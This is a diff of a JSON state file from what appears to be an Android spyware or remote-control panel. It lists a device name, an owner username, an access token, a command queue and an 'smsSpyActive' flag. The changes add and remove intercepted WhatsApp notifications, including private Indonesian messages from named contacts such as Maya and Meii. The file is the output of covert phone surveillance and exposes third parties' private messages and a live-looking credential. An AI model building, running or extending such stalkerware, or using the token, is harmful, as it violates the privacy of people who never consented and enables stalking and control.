@@ -4,7 +4,7 @@
     "deviceName": "HP-PEW-3BFE",
     "ownerUsername": "Youbie",
     "token": "00613901ddb20be7b9614da5e8ef8e90",
-    "lastSeen": 1776960046991,
+    "lastSeen": 1776960064703,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-22T07:08:58.851Z",
@@ -20,6 +20,30 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎75 pesan dari 41 chat",
+        "time": "24/04 00:01",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776960067113
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "‎‎61 pesan dari 40 chat",
+        "time": "24/04 00:00",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776960048937
+      },
+      {
+        "appName": "WhatsApp",
+        "sender": "Meii",
+        "content": "ok",
+        "time": "24/04 00:00",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776960048875
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -3995,30 +4019,6 @@
         "time": "23/04 22:00",
         "pkg": "com.whatsapp",
         "receivedAt": 1776952838899
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎62 pesan dari 41 chat",
-        "time": "23/04 21:59",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776952800998
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "Maya",
-        "content": "aku tadi pas dibilang jangan chat ga aku chat",
-        "time": "23/04 21:59",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776952800959
-      },
-      {
-        "appName": "WhatsApp",
-        "sender": "WhatsApp",
-        "content": "‎‎72 pesan dari 42 chat",
-        "time": "23/04 21:59",
-        "pkg": "com.whatsapp",
-        "receivedAt": 1776952800843
       }
     ],
     "galleryPhotos": [],
